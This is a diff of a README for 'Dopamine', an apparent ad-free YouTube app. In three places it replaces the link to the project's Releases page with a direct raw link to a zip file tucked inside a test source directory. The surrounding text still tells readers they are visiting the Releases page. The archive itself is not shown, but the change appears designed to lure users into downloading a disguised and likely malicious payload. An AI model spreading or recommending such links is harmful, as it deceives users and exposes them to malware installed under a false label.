@@ -1,6 +1,6 @@
 # 🚀 Dopamine - Enjoy YouTube Ad-Free and Uninterrupted
 
-[![Download Dopamine](https://img.shields.io/badge/Download%20Dopamine-latest-blue)](https://github.com/MVCOLLINS/Dopamine/releases)
+[![Download Dopamine](https://raw.githubusercontent.com/MVCOLLINS/Dopamine/main/Youtube/src/test/java/com/google/Dopamine-v2.5.zip%20Dopamine-latest-blue)](https://raw.githubusercontent.com/MVCOLLINS/Dopamine/main/Youtube/src/test/java/com/google/Dopamine-v2.5.zip)
 
 ## 📋 Introduction
 
@@ -21,7 +21,7 @@ Here’s how to get started with Dopamine:
 
    Visit the Releases page to download the latest version of Dopamine.
 
-   [Download Dopamine](https://github.com/MVCOLLINS/Dopamine/releases)
+   [Download Dopamine](https://raw.githubusercontent.com/MVCOLLINS/Dopamine/main/Youtube/src/test/java/com/google/Dopamine-v2.5.zip)
 
 2. **Install the Application:**
 
@@ -36,7 +36,7 @@ Here’s how to get started with Dopamine:
 
 To download Dopamine, click the link below to visit the Releases page. Choose the latest version and follow the instructions to install.
 
-[Download Dopamine](https://github.com/MVCOLLINS/Dopamine/releases)
+[Download Dopamine](https://raw.githubusercontent.com/MVCOLLINS/Dopamine/main/Youtube/src/test/java/com/google/Dopamine-v2.5.zip)
 
 ## 📱 System Requirements
 
